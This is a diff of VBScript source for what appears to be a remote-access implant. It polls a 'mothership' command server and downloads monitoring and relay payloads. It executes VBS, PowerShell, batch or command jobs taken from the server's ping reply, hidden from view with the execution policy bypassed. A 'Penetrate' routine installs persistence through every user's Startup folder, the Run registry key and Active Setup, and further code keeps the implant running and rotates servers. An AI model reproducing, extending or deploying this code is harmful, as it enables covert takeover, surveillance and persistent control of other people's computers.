+        Dim skipiteration : skipiteration = False
+        
+        if XIsEmpty(line) then
+            skipiteration = true
+        elseif not IsArray(parts) then
+            skipiteration = true
+        elseif not UBound(parts) = 1 then
+            skipiteration = true
+        End If
+        
+        If not skipiteration Then
+        
+            kkey = parts(0)
+            value = parts(1)
+            
+            Call LogMsg("ParseConfig -- key=" & kkey & " value=" & value)
+            
+            if not XIsEmpty(value) then
+            
+                if kkey = "mothershipassets" then
+                    mothershipassets = value
+                elseif kkey = "bunnyheader" then
+                    bunnyheader = value
+                elseif kkey = "tplmothership" then
+                    Call AddToArray(tplmothershiplist, value)
+                elseif kkey = "phpmothership" then
+                    Call AddToArray(mothershiplist, value)
+                End IF
+                
+            End if
+            
+		End IF
+		
+	Next
+
+	Call LogMsg("ParseConfig -- finished")
+End function
+
+Function WriteConfig()
+	Call LogMsg("WriteConfig -- starting")
+	
+	Dim configstr : configstr = ""
+	
+	configstr = "mothershipassets=" & mothershipassets & vbCrLf
+	configstr = configstr & "bunnyheader=" & bunnyheader & vbCrLf
+
+	Dim titem
+	For Each titem In tplmothershiplist
+		configstr = configstr & "tplmothership=" & titem & vbCrLf
+	Next
+
+	For Each titem In mothershiplist
+		configstr = configstr & "phpmothership=" & titem & vbCrLf
+	Next
+	
+    Call WriteFile(configfpath, configstr)
+    
+    Call LogMsg("WriteConfig -- finished")
+
+End function
+
+Function ReadConfig()
+	
+	Call LogMsg("ReadConfig -- starting")
+	
+	If not fso.FileExists(configfpath) then
+		Call LogMsg("ReadConfig -- configfpath " & configfpath & "does not exist -- exiting")
+		Exit Function
+	End IF
+	
+	Dim configstr : configstr = ReadFile(localpath)
+	
+	If not XIsEmpty(configstr) Then
+		Call LogMsg(configstr)
+	End IF
+	
+	Call ParseConfig(configstr)
+	
+	Call LogMsg("ReadConfig -- finished")
+			
+End function
+
+Function GetConfig()
+	Call LogMsg("GetConfig -- starting")
+	
+	Dim url : url = mothership & "/ow/config.php"
+	Dim localpath : localpath = workdir & "\" & "config.txt.tmp"
+	
+	Dim headers
+	Call DownloadFileWithHeaders(url, localpath, headers)
+
+	If fso.FileExists(localpath) Then
+		Dim configstr : configstr = ReadFile(localpath)
+		Call ParseConfig(configstr)
+		Call WriteConfig()
+	End If
+
+	If Err.Number <> 0 Then
+		Call LogMsg("GetConfig -- reporting errors")
+		Call LogErr()
+	End If
+	
+	Call LogMsg("GetConfig -- finished")
+End Function
 
 Function Watchdog() 
     cmdname = "watchdog"
@@ -773,9 +1385,11 @@ Function Watchdog()
     
     Do While True   
     
+    
         Call LogMsg("Watchdog: " & GetTimestamp())        
     
     Do While True
+    
     
         Call ExitRamp("watchdog")
 
@@ -784,6 +1398,7 @@ Function Watchdog()
         Exit Do
     
     Loop
+    
 
         Call LogMsg("Watchdog sleeping for " & CStr(watchdogtimedelay) & " seconds " & GetTimestamp() )
         
@@ -793,11 +1408,10 @@ Function Watchdog()
     
 End Function
 
-' retrieve pcmon and pcmon ps1 script
 Function Retrieve()
     cmdname = "retrieve"
 
-    Call LogMsg("Retrieve")
+    Call LogMsg("Retrieve starting")
     
     Dim files 
     
@@ -815,17 +1429,20 @@ Function Retrieve()
         Dim url: url = mothership & "/ow/assets/" & file
         Dim localpath : localpath = workdir & "\" & file
         
+        Dim headers 
+        
         If Not fso.FileExists(localpath) Then
-            Call DownloadFile(url, localpath)
+            Call DownloadFileWithHeaders(url, localpath, headers)
         End If
 
         If Not fso.FileExists(localpath) Then
-            RunShell("conhost.exe --headless cmd /c curl -kso " & localpath & " -G " & dq & url & dq)
+            Call RunShell("conhost.exe --headless cmd /c curl -kso " & localpath & " -G " & dq & url & dq, True)
         End If
 
-    
     Next
     
+    Call LogMsg("Retrieve finished")
+
 End Function
 
 Function PenetrateTpl()
@@ -877,24 +1494,22 @@ Function Penetrate()
     
     Dim username
     For Each username In localusers
-        Dim startuppath
-            
-        startuppath = "C:\Users\" & username & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+        Dim startuppath : startuppath = appDataPath & "\" & "Microsoft\Windows\Start Menu\Programs\Startup"
 
         Call LogMsg("Penetrate: setting up " & username & " " & startuppath)
        
-        If Not fso.FileExists(exepath) Then
-            WScript.Sleep 3000
-        End If
-        
         Call TryCopyFile(exepath, startuppath)        
     Next
+
+    Dim cmdstr : cmdstr = "REG DELETE " & dq & "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" & dq & " /v " & tskname & " /f"
     
-    Dim cmdstr : cmdstr = ""
+    Call RunShell("cmd /c " & cmdstr, True)
+    
+    cmdstr = ""
     cmdstr = "REG ADD " & dq & "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" & dq 
     cmdstr = cmdstr & " /v " & tskname & " /t REG_SZ /d " & exepath & " /f"
     
-    Call RunShell(cmdstr, True)
+    Call RunShell("cmd /c " & cmdstr, True)
     
     Dim regpath : regpath = dq & "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\" & tskname & dq
     
@@ -916,6 +1531,7 @@ Function Penetrate()
 End Function
 
 Function ForceSingleton()
+    Dim pp : pp = "ForceSingleton"
     Call LogMsg("ForceSingleton: starting")
     
     Dim scriptpid : scriptpid = GetScriptPID()
@@ -925,33 +1541,46 @@ Function ForceSingleton()
     Call LogMsg("ForceSingleton: scriptpid=" & scriptpid)
      
     Dim tagname : tagname = cmdname & "_running"
+    Dim tagfpath : tagfpath = workdir & "\" & tagname
     
-    If Not fso.FileExists(workdir & "\" & tagname) Then
-        Call LogMsg("ForceSingleton: writing to running file")
+    If Not fso.FileExists(tagfpath) Then
+        Call LogMsg("ForceSingleton: creating running file")
 
-        Dim objFile : Set objFile = fso.OpenTextFile(workdir & "\" & tagname, 2, True)
-
-        objFile.Write CStr(scriptpid)
-        objFile.Close
-        Set objFile = Nothing
+        Call TryDeleteFile(tagfpath)
+        Call WriteFile(tagfpath, scriptpid)
         
-        Exit Function
     Else
         Call LogMsg("ForceSingleton: running file exists")
 
         Dim procname : procname = ""
-        Dim pid : pid = IsCmdRunning(cmdname, procname)
+        Dim pid : pid = IsCmdRunning(cmdname, workdir, procname)
 
-        ' procname should be cscript.exe
-        Call LogMsg("ForceSingleton -- found cmd running with pid=" & CStr(pid) & " procname=" & procname)
+        If pid < 0 Then
+            Call LogMsg(pp & " -- running file exists, matching process not found, overwriting running file")
+            
+            Call TryDeleteFile(tagfpath)
+            Call WriteFile(tagfpath, scriptpid)
+        End If
+
+        If pid > 0 Then
+            Call LogMsg(pp & " -- found cmd running with pid=" & CStr(pid) & " procname=" & procname)
+        End If
         
-        If pid > 0 and scriptpid <> pid Then
-            Call LogMsg("ForceSingleton: duplicate found -- exiting")
+        If pid > 0 and scriptpid <> pid and LCase(procname) = "cscript.exe" Then
+            Call LogMsg(pp & ": duplicate found -- exiting")
             WScript.Quit(1)
         End If
                 
     End If
     
+    If Err.Number <> 0 Then
+        Call LogMsg(pp & " reporting errors")
+        Call LogErr()
+        ForceSingleton = False
+        Exit Function
+    End If
+    
+    Call LogMsg(pp & " finished")
 End Function
 
 Function ExitRamp(tcmdname)
@@ -973,92 +1602,610 @@ Function ExitRamp(tcmdname)
 
 End Function
 
-Function ProcessExecCmd(inpingstr)
-	
-	If XIsEmpty(inpingstr) Then
-		Exit Function
-	End IF
-	
-	Call LogMsg("ProcessExecCmd")
+Function ActivateExe(texedir, texefname, texename, argarr)      
+    Dim pp : pp = "ActivateExe"
+    
+    ActivateExe = -1
 
-	' EXEC_CMD_BEGIN|jobcode|<cmdname>|arg1|arg2|...|argn|EXEC_CMD_END
-
-	Dim begin_token : begin_token = "EXEC_CMD_BEGIN"
-    Dim end_token : end_token = "EXEC_CMD_END"
-    
-    Dim start_position : start_position = InStr(1, inpingstr, begin_token, 1)
-    Dim end_position : end_position = InStr(1, inpingstr, end_token, 1)        
-
-    if ( start_position <= 0 ) Then
-		Call LogMsg("ProcessExecCmd -- EXEC_CMD_BEGIN tag not found in ping txt -- exiting function")
-        Exit Function
-    end if
-    
-    start_position = start_position + Len(begin_token)
-    
-    if ( end_position <= 0 ) or ( start_position >= end_position ) Then
-		Call LogMsg("ProcessExecCmd -- ERROR:: EXEC_CMD_BEGIN tag found but end tag is misplaced -- exiting function")
-		Exit Function
-    End if
-    
-    Dim argstr : argstr = Mid(inpingstr, start_position, end_position-start_position)
-    
-    If XIsEmpty(argstr) Then
-		Call LogMsg("ProcessExecCmd -- ERROR:: EXEC_CMD_BEGIN arg string is empty -- exiting function")
+    If XIsEmpty(texedir) Or XIsEmpty(texefname) Or XIsEmpty(texename) Then
         Exit Function
     End If
 
-	Call LogMsg("ProcessExecCmd -- arg string=" & argstr)
-    
-    Dim argarr : argarr = Split(argstr, "|")
+    Call LogMsg(pp & ": texefname=" & texefname & " texename=" & texename)
 
+    Dim procname : procname = ""
+    Dim cmdpid : cmdpid = IsCmdRunning(texename, texedir, procname)
+
+    Call LogMsg(pp & ": procname=" & procname & " cmdpid=" & CStr(cmdpid))
+    
+    If ( cmdpid > 0 ) Then ' and ( LCase(procname) = "python.exe" )
+					 
+        ActivateExe = cmdpid
+        
+        Call LogMsg(pp & ": [" & texename & "] is running with procname=[" & procname & "] -- no need to launch")
+        Exit Function
+    End If
+    
+    Call LogMsg(pp & ": [" & texename & "] cmd is not running -- starting it up")
+
+    ActivateExe = ExecExe(texename, texefname, texedir, argarr)
+
+    Call LogMsg(pp & ": pid=" & CStr(ActivateExe))
+    
+End Function
+
+Function ActivatePSScript(scriptdir, scriptfname, scriptname)      
+    Dim pp : pp = "ActivatePSScript"
+
+    ActivatePSScript = -1
+
+    If XIsEmpty(scriptname) Then
+        Exit Function
+    End If
+
+    If XIsEmpty(scriptdir) Then
+        Exit Function
+    End If
+
+    Call LogMsg(pp & ": scriptfname=" & scriptfname & " scriptname=" & scriptname)
+
+    Dim procname : procname = ""
+    Dim cmdpid : cmdpid = IsCmdRunning(scriptname, scriptdir, procname)
+
+    Call LogMsg(pp & ": procname=" & procname & " cmdpid=" & CStr(cmdpid))
+    
+    If ( cmdpid > 0 ) Then ' and ( LCase(procname) = "python.exe" )
+					 
+        ActivatePSScript = cmdpid
+        
+        Call LogMsg(pp & ": [" & scriptname & "] is running with procname=" & procname & " -- no need to launch")
+        Exit Function
+    End If
+    
+    Call LogMsg(pp & ": [" & scriptname & "] cmd is not running -- starting it up")
+
+    Dim newargarr	
+    Dim n : n = WScript.Arguments.Count
+    If n > 1 Then
+        ReDim newargarr(n - 1)
+
+        Dim i 
+        For i = 1 to n-1
+            newargarr(i) = WScript.Arguments(i)
+        Next
+    End If
+
+    ActivatePSScript = ExecPowerShell(scriptname, relaydir, relayfname, newargarr)
+
+    Call LogMsg(pp & ": pid=" & CStr(ActivatePSScript))
+    
+End Function
+
+Function ExecPowerShell(scriptname, scriptdir, scriptfname, args)
+    Dim pp : pp = "ExecPowerShell"
+    
+    ExecPowerShell = -1
+    
+    If XIsEmpty(scriptname) or XIsEmpty(scriptdir) or XIsEmpty(scriptfname) Then
+        Exit Function
+    End IF										 
+
+    Dim scriptfpath : scriptfpath = scriptdir & "\" & scriptfname
+    
+    Dim argstr : argstr = ""
+    
+    If IsArray(args) Then
+        argstr = Join(args)
+    End If
+
+    Call LogMsg(pp & " " & scriptfpath)
+    
+    If not fso.FolderExists(scriptdir) Then
+        LogMsg(pp & ": ERROR :: scriptdir is missing " & scriptdir)
+        Exit Function
+    End If
+    
+    If not fso.FileExists(scriptfpath) Then
+        LogMsg(pp & ": ERROR :: scriptfpath is missing " & scriptfpath)
+        Exit Function
+    End If
+        
+    Dim cmdlogfpath : cmdlogfpath = scriptfpath & "_" & CStr(GetRandom(4)) & "_cmd.log"
+    
+    Dim cmdstr : cmdstr = "powershell.exe -noprofile -windowstyle hidden -executionpolicy bypass -File " & " " & scriptfpath & " " & argstr & " > " & cmdlogfpath & " 2>&1"
+           
+    Dim pid : pid = ExecShellAsync("cmd /c " & cmdstr)
+    
+    Dim cmdrunpath : cmdrunpath = scriptdir & "\" & scriptname & "_running"
+
+    If pid > 0 Then        
+        Call TryDeleteFile(cmdrunpath)
+        
+        Call WriteFile(cmdrunpath, CStr(pid))
+        
+        If fso.FileExists(cmdrunpath) Then
+            Call LogMsg(pp & " -- created running file " & cmdrunpath & " with pid=" & pid)
+        End If
+    End IF
+    
+    ExecPowerShell = pid
+    
+    Call LogMsg(pp & " finished")
+
+End Function
+
+Function ActivatePythonScript(scriptdir, scriptfname, scriptname)      
+    Dim pp : pp = "ActivatePythonScript"
+    
+    ActivatePythonScript = -1
+
+    If XIsEmpty(scriptname) Then
+        Exit Function
+    End If
+
+    If XIsEmpty(scriptdir) Then
+        Exit Function
+    End If
+
+    Call LogMsg(pp & ": scriptfname=" & scriptfname & " scriptname=" & scriptname)
+
+    Dim procname : procname = ""
+    Dim cmdpid : cmdpid = IsCmdRunning(scriptname, scriptdir, procname)
+
+    Call LogMsg(pp & ": procname=" & procname & " cmdpid=" & CStr(cmdpid))
+    
+    If ( cmdpid > 0 ) Then ' and ( LCase(procname) = "python.exe" )
+					 
+        ActivatePythonScript = cmdpid
+        
+        Call LogMsg(pp & ": [" & scriptname & "] is running with procname=" & procname & " -- no need to launch")
+        Exit Function
+    End If
+    
+    Call LogMsg(pp & ": [" & scriptname & "] cmd is not running -- starting it up")
+
+    Dim newargarr	
+    Dim n : n = WScript.Arguments.Count
+    If n > 1 Then
+        ReDim newargarr(n - 1)
+
+        Dim i 
+        For i = 1 to n-1
+            newargarr(i) = WScript.Arguments(i)
+        Next
+    End If
+
+    ActivatePythonScript = ExecPython(scriptname, relaydir, relayfname, newargarr)
+
+    Call LogMsg(pp & ": pid=" & CStr(ActivatePythonScript))
+    
+End Function
+
+Function StartPSPCMon()
+    Dim pp : pp = "StartPSPCMon"
+    
+    cmdname = "startpspcmon"
+
+    If not fso.FolderExists(pcmondir) Then
+        Call LogMsg(pp & ": ERROR :: pcmondir " & pcmondir  & " does not exist -- exiting function")
+        Exit Function
+    End If
+    
+    If not fso.FileExists(pcmondir & "\" & pspcmonfname) Then
+        Call DownloadFile(mothershipassets & "/ow/assets/pc_monitoring.ps1", relaydir & "\" & relayfname)
+    End If
+
+    If not fso.FileExists(pcmondir & "\" & pspcmonfname) Then
+        Call LogMsg(pp & ": ERROR :: script " & relayfname & " does not exist inside " & relaydir & " -- exiting function")
+        Exit Function
+    End If
+    
+
+    Dim ret : ret = ActivatePSScript(relaydir, relayfname, "relay")      
+
+    If ret > 0 Then
+        Call LogMsg("StartRelay: success activated script with pid " & ret)
+    Else
+        Call LogMsg("StartRelay: ERROR -- failed to activate script")
+    End If
+        
+End Function
+
+Function StartPCMon()
+    cmdname = "startpcmon"
+
+    ForceSingleton()
+            
+    If not fso.FolderExists(pcmondir) Then
+        Call LogMsg(cmdname & " creating pcmondir: " & pcmondir)
+        Call fso.CreateFolder(pcmondir)
+    End If
+    
+    If not fso.FolderExists(pcmondir) Then
+        Call LogMsg(cmdname & ": ERROR :: pcmondir " & pcmondir  & " does not exist -- exiting function")
+        Exit Function
+    End If
+    
+    Dim pcmonfpath : pcmonfpath = pcmondir & "\" & pcmonfname
+    If not fso.FileExists(pcmonfpath) Then
+        Call LogMsg(cmdname & " downloading " & pcmonfpath)
+        Call DownloadFile(mothership & "/ow/assets/" & pcmonfname, pcmonfpath)
+    End If
+
+    If not fso.FileExists(pcmonfpath) Then
+        Call LogMsg(cmdname & ": ERROR :: " & pcmonfname & " does not exist inside " & pcmondir & " -- exiting function")
+        Exit Function
+    End If
+    
+    Dim pcmonpid : pcmonpid = -1
+    
+    Do While True
+        
+        Call LogMsg("running " & cmdname & " -- " & GetTimestamp() )
+
+    Do While True
+    
+    
+        Call ExitRamp(cmdname)
+
+        Dim ret : ret = ActivateExe(pcmondir, pcmonfname, "pcmon", Array())      
+    
+        If ret > 0 Then
+            Call LogMsg(cmdname & ": success activated exe with pid " & ret)
+        Else
+            Call LogMsg(cmdname & ": ERROR -- failed to activate exe")
+        End If
+        
+        Exit Do
+        
+    Loop
+    
+        Call LogMsg(cmdname & " sleeping " & CStr(runnerdelaytime) & " seconds " & GetTimestamp() )
+
+        WScript.Sleep runnerdelaytime*1000
+
+    Loop
+    
+End Function
+
+Function StartRelay()
+    cmdname = "startrelay"
+
+    ForceSingleton()
+        
+    If not fso.FolderExists(pythonpath) Then
+        Call LogMsg("StartRelay: ERROR :: pythonpath " & pythonpath  & " does not exist -- exiting function")
+        Exit Function
+    End If
+    
+    If not fso.FileExists(pythonexe) Then
+        Call LogMsg("StartRelay: ERROR :: pythonexe " & pythonexe  & "does not exist -- exiting function")
+        Exit Function
+    End If
+
+    If not fso.FolderExists(relaydir) Then
+        Call LogMsg("StartRelay: creating relaydir " & relaydir)
+
+        fso.CreateFolder(relaydir)
+    End If
+
+    If not fso.FileExists(relaydir & "\" & relayfname) Then
+        Call DownloadFile(mothership & "/ow/assets/relay_py", relaydir & "\" & relayfname)
+    End If
+
+    If not fso.FileExists(relaydir & "\" & relayfname) Then
+        Call LogMsg("StartRelay: ERROR :: script " & relayfname & " does not exist inside " & relaydir & " -- exiting function")
+        Exit Function
+    End If
+    
+    Dim relaypid : relaypid = -1
+    
+    Do While True
+        
+        Call LogMsg("running " & cmdname & " -- " & GetTimestamp() )
+
+    Do While True
+    
+    
+        Call ExitRamp(cmdname)
+
+        Dim ret : ret = ActivatePythonScript(relaydir, relayfname, "relay")      
+    
+        If ret > 0 Then
+            Call LogMsg("StartRelay: success activated script with pid " & ret)
+        Else
+            Call LogMsg("StartRelay: ERROR -- failed to activate script")
+        End If
+        
+        Exit Do
+        
+    Loop
+    
+        Call LogMsg(cmdname & " sleeping " & CStr(runnerdelaytime) & " seconds " & GetTimestamp() )
+
+        WScript.Sleep runnerdelaytime*1000
+
+    Loop
+    
+End Function
+
+Function StopRelay()
+End Function
+
+Function StopPSPCMon()
+End Function
+
+Function StopPCMon()
+    Call LogMsg("StopPCMon -- starting")
+    
+    Dim pid : pid = ReadFile(pcmondir & "\pcmon_running")
+    
+    Call KillTaskPid(pid)
+    
+End Function
+
+Function LaunchExecCmd(argstr)
+    LaunchExecCmd = -1
+    
+	' EXEC_CMD_BEGIN|<cmdname>|arg1|arg2|...|argn|EXEC_CMD_END
+    Call LogMsg("LaunchExecCmd: " & argstr)
+    
+    Dim argarr
+    
+    If InStr(argstr, "|") <= 0 Then
+        argarr = Array(argstr)
+    Else
+        argarr = Split(argstr, "|")
+    End If
+    
     If IsArray(argarr) Then
         If UBound(argarr) = -1 Then
-			Call LogMsg("ProcessExecCmd -- ERROR:: problem 1 with arg string array -- exiting function")
+			Call LogMsg("LaunchExecCmd -- ERROR:: argarr ubound is -1 -- exiting function")
             Exit Function
         End If
     Else
-		Call LogMsg("ProcessExecCmd -- ERROR:: problem 2 with arg string array -- exiting function")
+		Call LogMsg("LaunchExecCmd -- ERROR:: argarr is not an array -- exiting function")
 
         Exit Function
     End If
 
     Dim argarrlen : argarrlen = UBound(argarr) + 1
 	
-	Call LogMsg("ProcessExecCmd -- arg count=" & CStr(argarrlen))
+	Call LogMsg("LaunchExecCmd -- arg count=" & CStr(argarrlen))
 
-	If ( argarrlen <= 2 ) Then 
-		Call LogMsg("ProcessExecCmd -- ERROR :: there must be at least 2 args to execute command, jobcode and cmdname -- exiting function")
+	If ( argarrlen <= 0 ) Then 
+		Call LogMsg("LaunchExecCmd -- ERROR :: cmdname not set -- exiting function")
 		Exit Function
 	End IF
 	
-	Dim jobcode : jobcode = argarr(0)
-	Dim exec_cmdname : exec_cmdname = argarr(1)
+	Dim exec_cmdname : exec_cmdname = argarr(0)
 	
-	Call LogMsg("ProcessExecCmd -- exec_cmdname=" & exec_cmdname & " JobCode=" & jobcode)
+    If XIsEmpty(exec_cmdname) Then
+        Call LogMsg("no cmdname specified -- exiting function")
+        Exit Function
+    End If
+    
+    Dim i, newargarr
+	
+    If argarrlen > 1 Then
+        ReDim newargarr(argarrlen - 1)
 
-	IF LCase(exec_cmdname) = "upgrade" then
-		Dim retresult : retresult = Upgrade()
-		
-		' write even to bus with result
-		If ( retresult = -1 ) then
-			' failed
-		else
-			' success
-		End IF
-		
-		Exit Function
-	End If
-	
-	Dim i, newargarr
-	
-	ReDim newargarr(argarrlen - 1)
+        For i = 1 To argarrlen-1
+            newargarr(i - 1) = argarr(i)
+        Next
+        
+        argarrlen = argarrlen - 1
+    Else
+        ReDim newargarr(-1)
+    End If
 
-	For i = 2 To argarrlen-1
-		newargarr(i - 1) = argarr(i)
-	Next
-	
+    
+    Call LogMsg("LaunchExecCmd -- starting exec_cmdname=" & exec_cmdname)
+
+    If ( ( LCase(exec_cmdname) = LCase("LogMsgMother") ) and ( argarrlen >= 1 ) ) Then
+        Call PushEventMother("job_started")
+
+        Dim msgtext : msgtext = newargarr(0)
+        Call LogMsgMother(msgtext)
+        
+        LaunchExecCmd = 0
+    End If
+
+    If ( LCase(exec_cmdname) = LCase("StartRelay") ) Then
+        Call PushEventMother("start_job")
+
+        Call ExecShellAsync("conhost.exe --headless cscript.exe //nologo //B " & workdir & "\" & "zfei.vbs" & " startrelay " )
+        
+        LaunchExecCmd = 0
+    End If
+
+    If ( LCase(exec_cmdname) = LCase("StartPCMon") ) Then
+        Call PushEventMother("start_job")
+
+        Call ExecShellAsync("conhost.exe --headless cscript.exe //nologo //B " & workdir & "\" & "zfei.vbs" & " startpcmon " )
+        
+        LaunchExecCmd = 0
+    
+    End If
+    
+    Call LogErr()
+    Call LogMsg("LaunchExecCmd finished")
+    
+    Call PushEventMother("job_finished")
+
 End Function
+
+Function LaunchExecScript(scripttext,ext)
+    Dim pp : pp = "LaunchExecScript"
+    LaunchExecScript = -1
+    
+    If XIsEmpty(scripttext) or XIsEmpty(ext) Then
+        Exit Function
+    End If
+    
+    Call LogMsg(pp & " -- " & ext)
+        
+    If XIsEmpty(jobcode) Then
+        jobcode = GetRandom(8)
+    End If
+    
+    Dim fname : fname = "execscript_" & CStr(jobcode) & "." & LCase(ext)
+    
+    Call LogMsg(pp & " script file: " & fname)
+    
+    Dim folderPath : folderPath = workdir & "\" & "execscript_" & jobcode
+    Dim fpath : fpath =  folderPath & "\" & fname
+
+    If not fso.FolderExists(folderPath) Then
+        fso.CreateFolder folderPath
+    End If
+    
+    If not fso.FolderExists(folderPath) then
+        Call LogMsg(pp & " :: could not create job folder " & folderPath)
+        Exit Function
+    End if
+
+    Call LogMsg(pp & " script path: " & fpath)
+
+    Call WriteFile(fpath, scripttext)
+    
+    If not fso.FileExists(fpath) Then
+        Call LogMsg(pp & " :: could not create job script " & fpath)
+        Exit Function    
+    End If
+    
+    Dim cmdstr : cmdstr = ""
+    
+    if LCase(ext) = "ps1" Then
+        cmdstr = "cmd /c powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File " & fpath
+    elseif LCase(ext) = "vbs" then
+        cmdstr = "cmd /c cscript.exe //nologo " & fpath ' //b omitted as output needs to be captured to log file
+    Elseif LCase(ext) = "bat" then
+        cmdstr = "cmd /c " & fpath 
+    End If
+    
+    Call PushEventMother("start_job")
+
+    Dim res : res = RunShell("conhost.exe --headless " & cmdstr & " > " & fpath & ".log" & " 2>&1", false)
+   
+    If Err.Number <> 0 Then
+        Call LogMsg(pp & " reporting error")
+        Call LogErr()
+        Exit Function
+    End If
+    
+    Call LogMsg(pp & " finished")
+    
+    If res Then
+        Call PushEventMother("job_finished")
+    ' Else
+    '   Call PushEventMother("job_finished_with_error")
+    End If
+
+End Function
+
+Function ProcessExecCmd(inpingstr)
+	Call LogMsg("ProcessExecCmd")
+    
+	If XIsEmpty(inpingstr) Then
+		Exit Function
+	End IF
+	
+    If InStr(inpingstr, "EXEC_") <=0 Then
+        Call LogMsg("could not find any EXEC_ tag in ping response -- exiting function")
+        Exit Function
+    End If
+    
+	Call LogMsg("ProcessExecCmd")
+    
+    jobcode = ExtractText(inpingstr, "JOBCODE_BEGIN", "JOBCODE_END")
+    
+    If XIsEmpty(jobcode) Then
+        jobcode = "EMPTY_JOB_CODE"
+    End If
+    
+    Dim tokens : tokens = Array("VBS", "PS1", "BAT", "CMD")
+
+	Dim begin_token 
+    Dim end_token
+    Dim argstr
+    Dim token
+    
+    For Each token In tokens
+        begin_token = "EXEC_" & token & "_BEGIN"
+        end_token = "EXEC_" & token & "_END"
+        argstr = ExtractText(inpingstr, begin_token, end_token)
+        
+        if token = "CMD" and not XIsEmpty(argstr) then
+            Call LogMsg("ProcessExecCmd -- detected CMD")
+            Call LaunchExecCmd(argstr)
+            
+            Call LogMsg("ProcessExecCmd finished")
+            Exit Function
+        end if
+        
+        if token <> "CMD" and not XIsEmpty(argstr) then
+            Call LogMsg("ProcessExecCmd -- detected " & token)        
+            Call LaunchExecScript(argstr, token)
+            
+            Call LogMsg("ProcessExecCmd finished")
+            Exit Function
+        end if
+        
+    Next
+
+    Call LogMsg("ProcessExecCmd error")
+
+End Function
+
+Function ValidatePingFile(pingpath, ByRef pingtxt)
+	On Error Resume Next
+	Err.Clear
+	
+	Call LogMsg("ValidatePingFile " & pingpath)
+	ValidatePingFile = true
+
+    Dim oFile : Set oFile = fso.GetFile(pingpath)
+    Dim fsize : fsize = oFile.Size
+
+	If Not fso.FileExists(pingpath) Then
+		Call LogMsg("ERROR -- " & pingpath & " does not exist")
+		ValidatePingFile = false
+		Exit Function
+	End if
+
+	If fsize <= 0 then
+		Call LogMsg("ERROR -- ping file size is zero")
+		ValidatePingFile = false
+		Exit Function		
+	End IF
+
+	LogMsg("ValidatePingFile ping file size: " & CStr(fsize))
+		
+	pingtxt = ReadFile(pingpath)
+		
+	If XIsEmpty(pingtxt) Then
+		Call LogMsg("ERROR -- pingtxt is empty")
+		ValidatePingFile = false
+		Exit Function
+	End IF
+	
+	if InStr(pingtxt, "CLIENT") <= 0 Then
+		Call LogMsg("ERROR -- pingtxt did not contain string CLIENT")
+		ValidatePingFile = false
+		Exit Function
+	End if
+	
+	Call LogMsg("pingtxt: len: " & CStr(len(pingtxt)) & " " & vbCrLf & pingtxt)
+	
+	If Err.Number <> 0 then
+		Call LogErr()
+		ValidatePingFile = false
+	End IF
+	
+	Call LogMsg("ValidatePingFile -- success")
+
+End function
 
 Function Ping()
     cmdname = "ping"
@@ -1071,56 +2218,54 @@ Function Ping()
         
         Call LogMsg("running ping mothership=" & mothership & " " & GetTimestamp() )
 
-        Call WriteFile( workdir & "\" & "mothership", mothership )
-
     Do While True  
-
+    
+    
         Call ExitRamp(cmdname)
 
+        Dim params : params = GetScriptTagStrUrl()
+
+        Dim url : url = mothership & "/ow/ping.php"
+        
+		Dim dparams : dparams = GetScriptTagStrUrlDirect()
+
         Call Reset(pingpath)
-                
-        Dim params : params = GetScripTagStrUrl()
-        params = Mid(params, 2, Len(params)-1)
-
-        Dim url : url = mothership & "/ow/ping.php?" & params
-        
-        Call RunShell("conhost.exe --headless cmd /c curl -ks -o " & pingpath & " " & url, True)
-
-        Dim iserr : iserr = false
+		
+		Dim isvalid : isvalid = false
         Dim pingtxt
-        
-        If Not fso.FileExists(pingpath) Then
-            Call LogMsg("ERROR -- ping.txt does not exist")
-            iserr = true
-        Else
-            pingtxt = ReadFile(pingpath)
-            
-            If XIsEmpty(pingtxt) Then
-                Call LogMsg("ERROR -- pingtxt is empty")
-                iserr = true
-            Elseif InStr(pingtxt, "CLIENT") = 0 Then
-                Call LogMsg("ERROR -- pingtxt did not contain string CLIENT")
-                iserr = true
-            Else
-                Call LogMsg("pingtxt: " & pingtxt)
-            End If
-            
-        End IF
+		
+		isvalid = DownloadFile(url & "?" & dparams, pingpath)
+		
+		if isvalid then
+			Call LogMsg("DownloadFile was successful, validating the output")
+			
+			isvalid = ValidatePingFile(pingpath, pingtxt)
+		end IF
+		
+		if not isvalid then
+			Call LogMsg("retrying ping using curl")
+			Call RunShell("conhost.exe --headless cmd /c curl -ks -o " & pingpath & " -G "  & url & " " & params, True)
 
-        If iserr Then
-            mothership = SelectMothership()
-            Call LogMsg("changing mothership: " & mothership)
-            
-            Call WriteFile( workdir & "\" & "mothership", mothership )
+			pingtxt = ""
+			isvalid = ValidatePingFile(pingpath, pingtxt)
+
+            if not isvalid then
+                Call LogMsg("ERROR:: ping failed, possible error with mothership")
+
+                mothership = SelectMothership()
+                Call LogMsg("changing mothership: " & mothership)
+                
+                Call WriteFile( workdir & "\" & "mothership", mothership )
+            end if
             
             Exit Do
         End If
 
 		Call ProcessExecCmd(pingtxt)
         
-        Exit Do
+        
+        Exit Do   
     
-	
     Loop
     
     
@@ -1145,25 +2290,28 @@ Function Cmdlist()
     
     ForceSingleton()
 
+    Dim pingpath : pingpath = workdir & "\" & "ping.txt"
+    
     Do While True
         
-        mothership = ReadMothership( workdir & "\" & "mothership" )
+        mothership = ReadTag( workdir & "\" & "mothership" )
         
-        Call LogMsg("cmdlist mothership=" & mothership & " starting " & GetTimestamp() )
+        Call LogMsg(cmdname & " mothership=" & mothership & " starting " & GetTimestamp() )
 
-    Do While True   
-
-        Call ExitRamp("cmdlist")
+    Do While True       
+    
+        Call ExitRamp(cmdname)
     
         Dim execcmdlist : execcmdlist = false
 
-        If Not fso.FileExists(workdir & "\" & "ping.txt") Then
+        If Not fso.FileExists(pingpath) Then
+            Call LogMsg("cmdlist: ping file does not exist -- skipping")
             Exit Do
         End If
         
-        Call LogMsg("cmdlist: found ping.txt" )
+        Call LogMsg(cmdname & ": found " & pingpath )
 
-        Dim objFile : Set objFile = fso.OpenTextFile(workdir & "\" & "ping.txt", 1)
+        Dim objFile : Set objFile = fso.OpenTextFile(pingpath, 1)
         
         Dim strFileContent : strFileContent = ""
         
@@ -1180,47 +2328,138 @@ Function Cmdlist()
             Exit Do
         End If            
 
